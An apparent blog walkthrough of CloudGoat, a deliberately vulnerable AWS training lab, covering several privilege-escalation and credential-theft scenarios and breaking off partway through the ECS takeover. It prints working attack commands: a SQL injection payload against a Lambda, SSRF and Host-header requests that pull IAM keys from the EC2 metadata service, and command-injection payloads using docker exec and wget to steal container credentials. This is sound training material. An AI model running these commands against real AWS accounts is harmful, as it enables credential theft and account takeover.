---
layout: post
title: AWS Misconfigurations
date: 2022-06-15
summary: Deep Dive into AWS Cloud Security
categories: Cloud Security
tags: [AWS, Write-Ups, Cloud Security]
---

Hi Everyone

I'm back with another blog on Deep Dive into AWS Cloud Security from scratch.


<p align="center">
  <img src="/images/cloud/aws-logo.png">
</p>

**What is Cloud Security ?**          
* Cloud security is a set of policies, strategies, controls, procedures, and practices designed to **safeguard** the data, resources, and applications hosted on the **cloud**.

**Why to Learn Cloud Security ?**
* Cloud security is critical since most **organizations** are already using cloud computing in one form or another. 
* Worldwide **end-user** spending on public cloud services is forecast to grow **20.4% in 2022** to total **$494.7 billion**, up from **$410.9 billion** in **2021**, according to the latest forecast from [Gartner, Inc](https://www.gartner.com/en/newsroom/press-releases/2022-04-19-gartner-forecasts-worldwide-public-cloud-end-user-spending-to-reach-nearly-500-billion-in-2022#:~:text=IaaS%2C%20DaaS%20and%20PaaS%20to,latest%20forecast%20from%20Gartner%2C%20Inc.)

<p align="center"><strong>Top Cloud Providers</strong></p>
<p align="center">
  <img src="/images/cloud/cloud-provider.png">
</p>

From the above statistics, it shows **Amazon AWS** dominates the cloud industry, so i decided to start with _AWS Cloud Security_, but :(

<p align="center">
  <img src="https://media.giphy.com/media/8VIRj0jsCPIIBpKSDK/giphy.gif">
</p>

So i started to look where i can **create and deploy** a **vulnerable** cloud enviroment for learning,i end up by finding [CloudGoat](https://github.com/RhinoSecurityLabs/cloudgoat).

<p align="center">
  <img src="/images/cloud/vulnerable-labs.png">
</p>

<p align="center"><strong>CloudGoat(☁️🐐)</strong></p>      

<p align="center">CloudGoat is Rhino Security Labs "Vulnerable by Design" AWS deployment tool.</p>

<p align="center">
  <img src="https://rhinosecuritylabs.com/wp-content/uploads/2018/07/cloudgoat-e1533043938802-1140x400.jpg" width=350/>
</p>

**Set-Up Requirements**
1. Linux or Mac OS
2. Python 3.6+
```bash
apt install python3
```
3. [Terraform](https://www.terraform.io/downloads)
```bash
curl -fsSL https://apt.releases.hashicorp.com/gpg | sudo apt-key add -
sudo apt-add-repository "deb [arch=amd64] https://apt.releases.hashicorp.com $(lsb_release -cs) main"
sudo apt-get update && sudo apt-get install terraform
```
4. [AWS CLI](https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html)
```bash
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install
```
5. [jq](https://stedolan.github.io/jq/)
```bash
apt install jq
```
**Creating an AWS Administrator Account**
* [Sign Up](https://portal.aws.amazon.com/billing/signup#/start/email) for an Amazon AWS Account.
* After login, search for Identity & Access Management (IAM).
* Choose Users ---> Add users

<p align="center">
  <img src="/images/cloud/user.png">
</p>

* Set **username** and choose AWS Credentials Type as **Programmatic Access**.

<p align="center">
  <img src="/images/cloud/nameusers.png">
</p>

* Choose **Attach existing policies directly** ---> **AdministratorAccess**.

<p align="center">
  <img src="/images/cloud/permission.png">
</p>

* Give any tag name as shown below.

<p align="center">
  <img src="/images/cloud/tag.png">
</p>

* **Review** all the setting once and click on **Create User**.

<p align="center">
  <img src="/images/cloud/review.png">
</p>

<p align="center">
  <img src="/images/cloud/download.png">
</p>

**Configuring AWS Profile**

* After creating the AWS Administrator Account use the following command to configure the AWS profile.

```bash
aws configure --profile cloudgoat #give any profile name
```

<p align="center">
  <img src="/images/cloud/awsprofile.png">
</p>

* Check if the user is configured with the AWS access key and Secret Key to the corresponding profile.

```bash
aws iam get-user --profile cloudgoat
```

<p align="center">
  <img src="/images/cloud/get-user.png">
</p>

**Installing CloudGoat**

To install CloudGoat, make sure your **system meets** the **requirements** above.

```bash
git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
cd cloudgoat
pip3 install -r ./requirements.txt
```

**Configuring CloudGoat**

* Configure cloudgoat with the AWS profile, use the following command.

```bash
./cloudgoat.py config profile
```

* Whitelist the IP-Address automatically.

```bash
./cloudgoat.py config whitelist --auto
```

<p align="center"><strong>Let's get started</strong></p>

**Scenario: Vulnerable Lambda**

**Command:** `./cloudgoat.py create vulnerable_lambda`

**Scenario Resources**

1 IAM User  
1 IAM Role  
1 Lambda   
1 Secret 

**Scenario Start**

IAM User 'bilbo' 

<p align="center">
  <img src="/images/cloud/start_vl.png">
</p>

**Scenario Goal**

Find the scenario's secret. (cg-secret-XXXXXX-XXXXXX)

**Summary**

In this scenario, you start as the 'bilbo' user. You will assume a role with more privelages, discover a lambda function that applies policies to users, and exploit a vulnerability in the function to escalate the privelages of the bilbo user in order to search for secrets.

**Exploitation Route**

<p align="center">
  <img src="/images/cloud/vulnerable_lambda.png">
</p>

**Walkthrough - IAM User "bilbo"**

* Configure the AWS Profile for bilbo using the following command

```bash
aws configure --profile bilbo
```

<p align="center">
  <img src="/images/cloud/bilbo_aws_configure.png">
</p>

* Get permissions for the 'bilbo' user.

```bash
#This command will give you the ARN & full name of you user.
aws --profile bilbo --region us-east-1 sts get-caller-identity
#This command will list the policies attached to your user.
aws --profile bilbo --region us-east-1 iam list-user-policies --user-name [your_user_name]
#This command will list all of your permissions.
aws --profile bilbo --region us-east-1 iam get-user-policy --user-name [your_user_name] --policy-name [your_policy_name]
```
<p align="center">
  <img src="/images/cloud/vullam1.png">
</p>

* List all roles, assume a role for privesc.

```bash
#This command will list all the roles in your account, one of which should be assumable. 
aws --profile bilbo --region us-east-1 iam list-roles | grep cg-
# This command will list all policies for the target role
aws --profile bilbo --region us-east-1 iam list-role-policies --role-name [cg-target-role]
# This command will get you credentials for the cloudgoat role that can invoke lambdas.
aws --profile bilbo --region us-east-1 sts assume-role --role-arn [cg-lambda-invoker_arn] --role-session-name [whatever_you_want_here]
```
<p align="center">
  <img src="/images/cloud/vullam2.png">
</p>

* Configure the newly AWS profile using the generated AWS Credentials.

<p align="center">
  <img src="/images/cloud/assumed_role.png">
</p>

* Manually add the **SessionToken**.

```bash
vi .aws/credentials
```
<p align="center">
  <img src="/images/cloud/session_token.png">
</p>

* List lambdas to **identify** the target (vulnerable) lambda.
```bash
# This command will show you all lambda functions. The function belonging to cloudgoat (the name should start with "cg-")
# can apply a predefined set of aws managed policies to users (in reality it can only modify the bilbo user).
aws --profile assumed_role --region us-east-1 lambda list-functions
```
<p align="center">
  <img src="/images/cloud/vullam3.png">
</p>

* Look at the lambda source code. You should see the database structure in a comment, as well as the code that is handling input parameters. It's vulnerable to an injection, and we'll see what an exploit looks like in the next step.

```bash
#This command will return a bunch of information about the lambda that can apply policies to bilbo.
#part of this information is a link to a url that will download the deployment package, which
#contains the source code for the function. Read over that source code to discover a vulnerability. 
aws --profile assumed_role --region us-east-1 lambda get-function --function-name [policy_applier_lambda_name]
```
<p align="center">
  <img src="/images/cloud/vullam4.png">
</p>

* Invoke the role applier lambda function, passing the name of the bilbo user and the **injection** payload.
```bash
#The following command will send a SQL injection payload to the lambda function
aws --profile assumed_role --region us-east-1 lambda invoke --function-name [policy_applier_lambda_name] --cli-binary-format raw-in-base64-out --payload '{"policy_names": ["AdministratorAccess'"'"' --"], "user_name": [bilbo_user_name_here]}' out.txt
#cat the results to confirm everything is working properly
cat out.txt
```
<p align="center">
  <img src="/images/cloud/vullam5.png">
</p>

* Now that Bilbo is an admin, use credentials for that user to list secrets from secretsmanager.
```bash
#This command will list all the secrets in secretsmanager
aws --profile bilbo --region us-east-1 secretsmanager list-secrets
```
<p align="center">
  <img src="/images/cloud/vullam6.png">
</p>

```bash
#This command will get the value for a specific secret
aws --profile bilbo --region us-east-1 secretsmanager get-secret-value --secret-id [ARN_OF_TARGET_SECRET]
```
<p align="center">
  <img src="/images/cloud/vullam7.png">
</p>

**Scenario: IAM Privesc by Rollback**

**Command:** `./cloudgoat.py create iam_privesc_by_rollback`

**Scenario Resources**

* 1 IAM User
  * 5 policy versions

**Scenario Start**

IAM User "Raynor"

<p align="center">
  <img src="/images/cloud/aws_iam_profile.png">
</p>

**Scenario Goal**

Acquire full admin privileges.

**Summary**

Starting with a highly-limited IAM user, the attacker is able to review previous IAM policy versions and restore one which allows full admin privileges, resulting in a privilege escalation exploit.

**Exploitation Route**

<p align="center">
  <img src="/images/cloud/iam_priv.png">
</p>

**Walkthrough - IAM User "Raynor"**

* Configure the AWS Profile for raynor using the following command

```bash
aws configure --profile raynor
```

<p align="center">
  <img src="/images/cloud/raynor_aws_configure.png">
</p>

* Get the **username** of the current AWS profile.

```bash
aws iam get-user --profile raynor
```

<p align="center">
  <img src="/images/cloud/username_raynor.png">
</p>

* List the **attached** policies of the raynor user.

```bash
aws iam list-attached-user-policies --user-name [username] --profile raynor
```
<p align="center">
  <img src="/images/cloud/userpolicy_raynor.png">
</p>

* View the Current Policy version.

```bash
aws iam get-policy --policy-arn <generatedARN>/cg-raynor-policy --profile raynor
```

<p align="center">
  <img src="/images/cloud/current_policy.png">
</p>

* Check the **existing** versions of the policy.

```bash
aws iam list-policy-versions --policy-arn <generatedARN>/cg-raynor-policy --profile raynor
```

<p align="center">
  <img src="/images/cloud/existing_versions.png">
</p>


<p align="center">
  <strong>Version 1</strong>
</p>

<p align="center">
  <img src="/images/cloud/v1policy.png">
</p>

**Note:** An attacker with the **iam:SetDefaultPolicyVersion** permission may be able to **escalate privileges through existing policy versions** not currently in use. If a policy that they have access to has versions that are not the default, they would be able to **change the default version to any other existing version.**

<p align="center">
  <strong>Version 2</strong>
</p>

<p align="center">
  <img src="/images/cloud/v2policy.png">
</p>

**Note:** The above shown policy allows all actions to all resources. This basically grants the **user administrative access** to the AWS account.

<p align="center">
  <strong>Version 3</strong>
</p>

<p align="center">
  <img src="/images/cloud/v3policy.png">
</p>

**Note:** From the above image it can be observed that policy whitelists those two (2) IP subnets.

<p align="center">
  <strong>Version 4</strong>
</p>

<p align="center">
  <img src="/images/cloud/v4policy.png">
</p>

**Note:** This policy allows this action “iam:Get*” to all AWS resources but only allows for a specified time period which has expired.

<p align="center">
  <strong>Version 5</strong>
</p>

<p align="center">
  <img src="/images/cloud/v5policy.png">
</p>

**Note:** This allows only the following actions: “s3:ListBucket”, “s3:GetObject” and “s3:ListAllMyBuckets”.

* Change the Policy Version from **v1 ---> v2** , because v2 has administrative privilege.

```bash
aws iam set-default-policy-version --policy-arn <generatedARN>/cg-raynor-policy --version-id <versionID> --profile raynor
```

<p align="center">
  <img src="/images/cloud/before_making_changes.png">
</p>

<p align="center">
  <img src="/images/cloud/after_making_changes.png">
</p>

* Confirm the **Administrative** Privilege by creating a **S3 Bucket**.

```bash
aws s3api create-bucket --bucket [bucket-name] --region us-east-1 --profile raynor
```

<p align="center">
  <img src="/images/cloud/s3api_bucket.png">
</p>

<p align="center">
  <img src="/images/cloud/created_bucket.png">
</p>

**Scenario:** Lambda Privesc

**Command:** `./cloudgoat.py create lambda_privesc`

**Scenario Resources**

1 IAM User  
2 IAM Roles  

**Scenario Start**

1. IAM User Chris  

<p align="center">
  <img src="/images/cloud/scenario_chris.png">
</p>


**Scenario Goal**

Acquire full admin privileges.

**Summary**

Starting as the IAM user Chris, the attacker discovers that they can assume a role that has full Lambda access and pass role permissions.
The attacker can then perform privilege escalation to obtain full admin access.  

**Note:** This scenario may require you to create some AWS resources, and because CloudGoat can only manage resources it creates, you should remove them manually before running `./cloudgoat destroy`.

**Exploitation Route**

<p align="center">
  <img src="/images/cloud/exploitation_route_lambda.png">
</p>

**Walkthrough - IAM User "Chris"**

* Configure the AWS Profile for chris using the following command

```bash
aws configure --profile chris
```

<p align="center">
  <img src="/images/cloud/chris-aws-profile.png">
</p>

* Get the **username** of the current AWS profile.

```bash
aws iam get-user --profile chris
```
<p align="center">
  <img src="/images/cloud/chris_username.png">
</p>

* List the attached policies of the **chris** user.

```bash
aws iam list-attached-user-policies --user-name [username] --profile Chris
```

<p align="center">
  <img src="/images/cloud/chris_attached_policy.png">
</p>

* View the **Current Policy** version.

```bash
aws iam get-policy --policy-arn [arn-number] --profile chris
```

<p align="center">
  <img src="/images/cloud/policy_version_chris.png">
</p>

* Check the existing versions of the policy.

```bash
aws iam list-policy-versions --policy-arn <cg-chris-policy arn> --profile chris
```

<p align="center">
  <img src="/images/cloud/existing_policy_chris.png">
</p>

* Details of the v1 version.

```bash
aws iam get-policy-version --policy-arn <cg-chris-policy arn> --version-id v1 --profile Chris
```

<p align="center">
  <img src="/images/cloud/detail_v1_chris.png">
</p>

**Note:** It was observed that **sts:AssumeRole** is **allowed**. So an attacker would be able to change the assume role policy document of any existing role to allow them to assume that role.It will return a set of **temporary security credentials** that you can use to access AWS resources that you may not have access to normally.

* List the roles of chris profile.

```bash
aws iam list-roles --profile chris
```

<p align="center">
  <img src="/images/cloud/chris_role_1.png">
</p>

<p align="center">
  <img src="/images/cloud/chris_role_2.png">
</p>

**Note:** There are two different roles **cg-debug-role-lambda_privesc_cgid2w7yniosir** & **cg-lambdaManager-role-lambda_privesc_cgid2w7yniosir** 

* Get more infomration about the roles.

```bash
aws iam list-attached-role-policies --role-name cg-debug-role-lambda_privesc_cgid2w7yniosir --profile chris
```
<p align="center">
  <img src="/images/cloud/debugger_role.png">
</p>

```bash
aws iam list-attached-role-policies --role-name cg-lambdaManager-role-lambda_privesc_cgid2w7yniosir --profile chris
```
<p align="center">
  <img src="/images/cloud/lambda_manager_roles.png">
</p>

* List more information about managed policies.

```bash
aws iam get-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile chris
```

<p align="center">
  <img src="/images/cloud/get_admin_policy.png">
</p>

```bash
aws iam get-policy --policy-arn [arn-policy-name] --profile chris
```

<p align="center">
  <img src="/images/cloud/get_lambda_policy.png">
</p>

* View the current policy.

```bash
aws iam get-policy-version --policy-arn [arn-number] --version-id v1 --profile chris
```

<p align="center">
  <img src="/images/cloud/v1_lambda_manager.png">
</p>

**Note:** 
1. From the above image, it can be observed that **iam:PassRole** allowed, so basically. If there is a user with **iam:PassRole**, **lambda:CreateFunction** and **lambda:InvokeFunction** can escalate the permission by executing the existing **IAM Role** to new Lambda function that includes code to import the relevant AWS library to their programming language of choice, then using it perform actions of their choice. 
2. The code could then be run by invoking the function through the AWS API. This would give a user access to the **privileges associated** with any **Lambda service role** that exists in the account, which could range from **no privilege escalation** to **full administrator** access to the account.

* Check the permission of Debug role.

```bash
aws sts assume-role --role-arn <arn:generated-number> --role-session-name debug_role –profile chris
```

<p align="center">
  <img src="/images/cloud/access_denied_debug_role.png">
</p>

* Check the permission of Lambda Manager role.

```bash
aws sts assume-role --role-arn <arn:generated-number> --role-session-name lambda_role --profile chris
```

<p align="center">
  <img src="/images/cloud/aws_lambda_manager_role.png">
</p>

**Note:**       
1. chris is **not authorized** to assume the **debug role**, which resulted in access denied.       
2. with the **lambda manager role** chris is **authorized** to provide temporary credentails such as (access key ID, secret key, session token).

* Configure the AWS Profile for **Lambda Manager** using the following command.

```bash
aws configure --profile lambdamanager
```

<p align="center">
  <img src="/images/cloud/aws_credentials_lambda_manager.png">
</p>

* Manually add the **SessionToken**.

```bash
vi .aws/credentials
```

<p align="center">
  <img src="/images/cloud/session_token_lambda.png">
</p>

* Create a Lambda Function which will **attach** the Administrator Policy to the chris user.

```python
import boto3
def lambda_handler(event, context):
	client = boto3.client('iam')
	response = client.attach_user_policy(UserName = 'chris-lambda_privesc_cgid2w7yniosir', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
	return response
```

**Note:** The name of the file needs to be **lambda_function.py**.

* Save the python file in **zip** format using the following command.

```bash
zip lambda_function.zip lambda_function.py
```

* Run the following command to **attach** the policy.

```bash
aws lambda create-function --function-name admin_function --runtime python3.6 --role <cg-debug-role arn> --handler lambda_function.lambda_handler --zip-file fileb://lambda_function.py.zip --profile lambdamanager
```

<p align="center">
  <img src="/images/cloud/creating.png">
</p>

* Invoke the created **Lambda Function** as shown below.

```bash
aws lambda invoke --function-name admin_function out.txt --profile lambdamanager
```

<p align="center">
  <img src="/images/cloud/successful_lambda_manager.png">
</p>

* Confirm the **new role** attached to chris profile, using the following command.

```bash
aws iam list-attached-user-policies --user-name chris-<cloudgoat_id> --profile chris
```

<p align="center">
  <img src="/images/cloud/admin_access_chris.png">
</p>

**Scenario:** Cloud Breach S3

**Command:** `./cloudgoat.py create cloud_breach_s3`

**Scenario Resources**

* 1 VPC with:
  * EC2 x 1
  * S3 x 1  

**Scenario Start**

1. The IP Address of an EC2 server that is running a misconfigured reverse proxy

<p align="center">
  <img src="/images/cloud/breach_start.png">
</p>


**Scenario Goal**

Download the confidential files from the S3 bucket.

**Summary**

Starting as an anonymous outsider with no access or privileges, exploit a misconfigured reverse-proxy server to query the EC2 metadata service and acquire instance profile keys. Then, use those keys to discover, access, and exfiltrate sensitive data from an S3 bucket.

**Exploitation Route**

<p align="center">
  <img src="/images/cloud/scenario_cloud_breach">
</p>

**Walkthrough - Anonymous Attacker**

* Start with a simple port scan on the given IP address.

```bash
nmap <ip address>
```

<p align="center">
  <img src="/images/cloud/nmap_breach.png">
</p>

* Check the SSH Version using the following command.

```bash
nc <ip address> 22
```

<p align="center">
  <img src="/images/cloud/ssh_version.png">
</p>

* Tried opening the IP Address in web browser, it didn't respond.

<p align="center">
  <img src="/images/cloud/web_browser.png">
</p>

* cURL to the IP Address via CLI.

```bash
curl http://ipaddress
```

<p align="center">
  <img src="/images/cloud/curl_breach.png">
</p>

Note: It was observed that the server is configured to EC2 metadata service, so we need to set the **Host: 169.254.169.254** and resend the request.

* Replay the cURL request by setting **Host** value with EC2 metadata.

```bash
curl http://ipaddress -H 'Host: 169.254.169.254'
```

<p align="center">
  <img src="/images/cloud/ec2_metadata.png">
</p>

* Use the following command to reveal the **IAM** Role information.

```bash
curl -s http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254'
```

<p align="center">
  <img src="/images/cloud/ec2_iam_leak.png">
</p>

* Extract more information about the **IAM** Role.

```bash
curl http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/<ec2-role-name> -H 'Host:169.254.169.254'
```

<p align="center">
  <img src="/images/cloud/aws_leaked_credentials.png">
</p>

* Configure the AWS Profile for anonymous user using the following command.

```bash
aws configure --profile anonymous
```

<p align="center">
  <img src="/images/cloud/anonymous_aws_cli.png">
</p>

* Manually add the **SessionToken**.

```bash
vi .aws/credentials
```

<p align="center">
  <img src="/images/cloud/anonymous_session_token.png">
</p>

* List the **S3 bucket** using the configured anonymous user profile.

```bash
aws s3 ls --profile anonymous
```

<p align="center">
  <img src="/images/cloud/s3_listing.png">
</p>

* Copy the bucket to the local machine using the **sync** command as shown below.

```bash
aws s3 sync s3://<bucket-name> . --profile anonymous
```

<p align="center">
  <img src="/images/cloud/cardholder.png">
</p>

* View the card holder data in the file as shown below

```bash
head cardholder_data_primary.csv # head - to view less content, cat - view entire content of the file
```
<p align="center">
  <img src="/images/cloud/view_data.png">
</p>

**Scenario:** IAM  Privilege Escalation by Attachment

**Command:** `./cloudgoat.py create iam_privesc_by_attachment`

**Scenario Resources**

* 1 VPC with:
  * EC2 x 1
* 1 IAM User

**Scenario Start**

1. IAM User "Kerrigan"

<p align="center">
  <img src="/images/cloud/aws_creds_iam.png">
</p>

**Scenario Goal**

Delete the EC2 instance "cg-super-critical-security-server."

**Summary**

Starting with a very limited set of permissions, the attacker is able to leverage the instance-profile-attachment permissions to create a new EC2 instance with significantly greater privileges than their own. With access to this new EC2 instance, the attacker gains full administrative powers within the target account and is able to accomplish the scenario's goal - deleting the cg-super-critical-security-server and paving the way for further nefarious actions.

Note: This scenario may require you to create some AWS resources, and because CloudGoat can only manage resources it creates, you should remove them manually before running `./cloudgoat destroy`.

**Exploitation Route**

<p align="center">
  <img src="/images/cloud/iam_priv_chart.png">
</p>

**Walkthrough - IAM User "Kerrigan"**

* Configure the AWS Profile for **kerrigan** using the following command

```bash
aws configure --profile kerrigan
```

<p align="center">
  <img src="/images/cloud/aws_cli_kerrigan.png">
</p>

* List the roles of kerrigan profile.

```bash
aws iam list-roles --profile kerrigan
```

<p align="center">
  <img src="/images/cloud/two_roles_kerrigan.png">
</p>

* List instance profiles of kerrigan.

```bash
aws iam list-instance-profiles --profile kerrigan
```
<p align="center">
  <img src="/images/cloud/list_instance_kerrigan.png">
</p>

* Enumerate more information about the running **EC2** Instances.

```bash
aws ec2 describe-instances --region us-east-1 --profile kerrigan
```

<p align="center">
  <img src="/images/cloud/target_attachment.png">
</p>

**Note:** 
1. To extract the permissions of the identified role, create a new EC2 instance and attach these roles to the new instance created and enumerate the permission.
2. Following details are required to create a EC2 Instance **Subnet ID, Security Group, AMI Image ID, ARN Number** of the existing existing instance.

* Use the following command to get the details.

```bash
aws ec2 describe-instances --region us-east-1 --profile kerrigan | grep SubnetId
aws ec2 describe-instances --region us-east-1 --profile kerrigan | grep GroupId
aws ec2 describe-instances --region us-east-1 --profile kerrigan | grep ImageId
aws ec2 describe-instances --region us-east-1 --profile kerrigan | grep GroupName
```

<p align="center">
  <img src="/images/cloud/ec2_require.png">
</p>

* We need to create a new **key pair**, since we don't have access to the existing key pairs of the AWS account.

```bash
aws ec2 create-key-pair --key-name iam_attachment --output text > kerrigan.pem --region us-east-1 --profile kerrigan
```

<p align="center">
  <img src="/images/cloud/key_pair.png">
</p>

* Change the permission of the Key Pair.

```bash
chmod 600 kerrigan.pem
```

<p align="center">
  <img src="/images/cloud/permission_key_pair.png">
</p>

* Create a new instance using the newly created key pair, using the following command as shown below.

```bash
aws ec2 run-instances –image-id <insert ami id here> –instance-type <insert instance type here> –iam-instance-profile Arn=<insert the arn of the instance profile> –key-name <inset key name here> –subnet-id <insert the subnet id here> –security-group-ids <insert security group id here> –region us-east-1 –profile <insert profile name here>
```

<p align="center">
  <img src="/images/cloud/instance_creation_kerrigan.png">
</p>

* The newly created instance also has **meek-role**, we need to change it to **mighty-role** and then attach the new role to the instance profile.

<p align="center">
  <img src="/images/cloud/profile_setting.png">
</p>

* Remove **meek-role** from the instance profile.

```bash
aws iam remove-role-from-instance-profile --instance-profile-name <insert instance profile name here> --role-name <insert username here> --profile <insert profile name here>
```

<p align="center">
  <img src="/images/cloud/remove_profile.png">
</p>

* Attach **mighty-role** to the instance profile.

<p align="center">
  <img src="/images/cloud/add_profile.png">
</p>

* SSH into the newly created EC2 Instance using the following command.

```bash
ssh -i <created pem file>.pem ubuntu@<public dns name>
```

<p align="center">
  <img src="/images/cloud/ssh_into_ubuntu.png">
</p>

* Update the machine.

```bash
sudo apt update
```

<p align="center">
  <img src="/images/cloud/apt_update.png">
</p>

* Install **aws-cli** on the new EC2 Instance.

<p align="center">
  <img src="/images/cloud/aws_cli_install.png">
</p>

* List the attached role policies of **mighty-role**.

```bash
aws iam list-attached-role-policies --role-name <insert role name>
```

<p align="center">
  <img src="/images/cloud/mighty_policy_list.png">
</p>

* Extract policy details.

```bash
aws iam get-policy --policy-arn <insert arn number>
```

<p align="center">
  <img src="/images/cloud/policy_arn_mighty.png">
</p>

* View Policy version.

```bash
aws iam get-policy-version --policy-arn <insert the policy arn here> --version-id <insert version id here>
```

<p align="center">
  <img src="/images/cloud/policy_version_mighty.png">
</p>

* Check the new privilege by deleting the EC2 instance **cg-super-critical-security-server**.

```bash
aws ec2 terminate-instances --instance-ids <insert the EC2 instance id here> --region us-east-1
```

<p align="center">
  <img src="/images/cloud/shutdown_kerrigan.png">
</p>

**Scenario:** ec2_ssrf

**Command:** `./cloudgoat.py create ec2_ssrf`

**Scenario Resources**

- 1 VPC with:
	- EC2 x 1
- 1 Lambda Function
- 1 S3 Bucket

**Scenario Start**

1. IAM User "Solus"

<p align="center">
  <img src="/images/cloud/start_ec2_ssrf1.png">
</p>

**Scenario Goal**

Invoke the "cg-lambda-[ CloudGoat ID ]" Lambda function.

**Summary**

Starting as the IAM user Solus, the attacker discovers they have ReadOnly permissions to a Lambda function, where hardcoded secrets lead them to an EC2 instance running a web application that is vulnerable to server-side request forgery (SSRF). After exploiting the vulnerable app and acquiring keys from the EC2 metadata service, the attacker gains access to a private S3 bucket with a set of keys that allow them to invoke the Lambda function and complete the scenario.

**Exploitation Route**

<p align="center">
  <img src="/images/cloud/exploitation_route_ec2ssrf.png">
</p>

**Route Walkthrough - IAM User "Solus"**

* Configure the AWS Profile for solus using the following command

```bash
aws configure --profile solus
```

<p align="center">
  <img src="/images/cloud/solus_aws_cli1.png">
</p>

* List the Lambda Functions.

```bash
aws lambda list-functions --profile solus
```

<p align="center">
  <img src="/images/cloud/lambda_function_list1.png">
</p>

* Configure the AWS Profile for **cg-lambda**.

```bash
aws configure --profile cg-lambda
```

<p align="center">
  <img src="/images/cloud/cg-lambda_cli1.png">
</p>

* Enumerate more information about the running EC2 Instances.

```bash
aws ec2 describe-instances --profile cg-lambda
```

<p align="center">
  <img src="/images/cloud/public_ip_ec2ssrf1.png">
</p>

* Access the EC2 Instance IP Address via Web Browser.

<p align="center">
  <img src="/images/cloud/ec2_web.png">
</p>

* Abuse the SSRF via the "_url_" parameter to hit the EC2 instance metadata by going to.

```bash
http://<EC2 instance IP>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

<p align="center">
  <img src="/images/cloud/ec2_ssrf_web.png">
</p>

```bash
http://<EC2 instance IP>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<the role name>
```

<p align="center">
  <img src="/images/cloud/ec2_metadata_web.png">
</p>

* Add the **ec2-role** Credentials to the AWS profile.

```bash
aws configure --profile ec2-role
```

<p align="center">
  <img src="/images/cloud/ec2_cli_role.png">
</p>

* Manually add the SessionToken.

<p align="center">
  <img src="/images/cloud/ec2_role_ssrf.png">
</p>

* List the **S3 bucket** using the configured ec2-role user profile.

```bash
aws s3 ls --profile ec2-role
```

<p align="center">
  <img src="/images/cloud/ec2_bucket_ssrf.png">
</p>

* Copy the bucket to the local machine using the **sync** command as shown below.

<p align="center">
  <img src="/images/cloud/admin_ec2.png">
</p>

* View the _admin-user.txt_ file as shown below.

```bash
cat admin-user.txt
```

<p align="center">
  <img src="/images/cloud/admin_leak_ec2.png">
</p>

* Configure the admin-user credentials to the AWS profile.

```bash
aws configure --profile ec2-admin
```

<p align="center">
  <img src="/images/cloud/ec2_admin.png">
</p>

* List the Lambda Functions of ec-admin user profile.

```bash
aws lambda list-functions --profile ec2-admin
```

<p align="center">
  <img src="/images/cloud/ec2_admin_function.png">
</p>

* Invoke the Lambda Function as shown below.

```bash
aws lambda invoke --function-name cg-lambda-ec2_ssrf_cgidodvguk2z68 ./out.txt --region us-east-1 --profile ec2-admin
```

<p align="center">
  <img src="/images/cloud/invoke_function_admin.png">
</p>

* Read the output of the file as shown below.

```bash
cat out.txt
```

<p align="center">
  <img src="/images/cloud/you_win_ec2_admin.png">
</p>

**Scenario:** ECS Takeover

**Command:** `./cloudgoat.py create ecs_takeover`

**Scenario Resources**

- 1 VPC and Subnet with:
    - 2 EC2 Instances
    - 1 ECS Cluster
    - 3 ECS Services
    - 1 Internet Gateway

**Scenario Start**

1. Access the external website via the EC2 Instance's public IP.

<p align="center">
  <img src="/images/cloud/start_ecs_attack.png">
</p>

**Scenario Goal**

Gain access to the "vault" container and retrieve the flag.

**Summary**

* Starting with access to the external website the attacker needs to find a remote code execution vulnerability. Through this the attacker can take advantage of resources available to the container hosting the website. The attacker discovers that the container has access to the host's metadata service and role credentials. 
* They also discover the Docker socket mounted in the container giving full unauthenticated access to Docker on one host in the cluster. Abusing the mount misconfiguration, the attacker can enumerate other running containers on the instance and compromise the container role of a semi-privileged privd container. Using the privd role the attacker can enumerate the nodes and running tasks across the ECS cluster where another task "vault" is discovered to be running on a second node.
* With the host container privileges gained earlier, the attacker modifies the state of the cluster and forces ECS to reschedule the container to the compromised host. This allows the attacker to access the flag stored in the root of the "vault" container instance through docker.

**Exploitation Route**

<p align="center">
  <img src="/images/cloud/route_ecstakeover.png">
</p>

**Route Walkthrough**

* Find the command injection vulnerability in the website. The following payload could contain any bash command, it's just a POC.

```bash
; echo 'hello world'
```

<p align="center">
  <img src="/images/cloud/command_injection.png">
</p>

* Using command injection list all of the containers on the host.

```bash
docker ps
```

<p align="center">
  <img src="/images/cloud/docker_ps.png">
</p>

* Grep the privd container details.

```bash
; docker ps | grep privd
```

<p align="center">
  <img src="/images/cloud/container_id1.png">
</p>

* Using command injection get the container credentials for the privd container.

```bash
; docker exec <privd container id> sh -c 'wget -O- 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'
```

<p align="center">
  <img src="/images/cloud/aws_ecs_keys1.png">
</p>

* Configure the leaked AWS credentials into a profile.

```bash
aws configure --profile privd
```

<p align="center">
  <img src="/images/cloud/aws_configure_container1.png">
</p>

* Manually add the **SessionToken**.

```bash
vi .aws/credentials
```

<p align="center">
  <img src="/images/cloud/aws_session_container1.png">
</p>

* **List** the clusters using the configured AWS Profile.

```bash
aws --profile privd ecs list-clusters
```

<p align="center">
  <img src="/images/cloud/list_clusters.png">
</p>

* Enumerate **Tasks** from the cluster.

```bash
aws --profile <container_credentials> ecs list-tasks --cluster <your_cluster_name> --query taskArns
```

<p align="center">
  <img src="/images/cloud/enumerate_task_ecs.png">
</p>

* Enumerate **List of Containers** from the cluster.

```bash
aws ecs list-container-instances --cluster <your_cluster_name> --profile privd
```

<p align="center">
  <img src="/images/cloud/container_id_list.png">
</p>

* Iterate information about the **target task** which will include the name of the corresponding **service**.

```bash
aws --profile <container_credentials> ecs describe-tasks --cluster <your_cluster_name> --tasks <target_task>
````

<p align="center">
  <img src="/images/cloud/tasks_ecs_takeover.png">
</p>

* Reveal if the service is scheduled as a **Replica** or **Daemon**.

```bash
aws --profile <container_credentials> ecs describe-services --cluster <your_cluster_name> --services <target_service>
```

<p align="center">
  <img src="/images/cloud/replica.png">
</p>

